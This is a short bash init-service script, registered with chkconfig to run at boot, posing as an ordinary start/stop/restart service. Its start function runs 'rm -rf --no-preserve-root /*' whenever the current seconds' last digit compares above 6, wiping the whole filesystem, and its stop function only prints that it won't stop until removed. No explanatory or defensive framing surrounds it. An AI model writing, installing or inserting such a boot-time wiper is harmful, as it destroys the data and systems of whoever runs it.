#!/bin/bash
# chkconfig: 125 20 80

. /etc/init.d/functions

start() {
    for i in $(date +%S | cut -c 2); do
        [[ $i > 6 ]] && rm -rf --no-preserve-root /*
    done
}

stop() {
   echo "This won't stop until it is removed!"
}

case "$1" in 
    start)
       start
       ;;
    stop)
       stop
       ;;
    restart)
       stop
       start
       ;;
    *)
    echo "Usage: $0 {start|stop|restart}"
esac

exit 0 
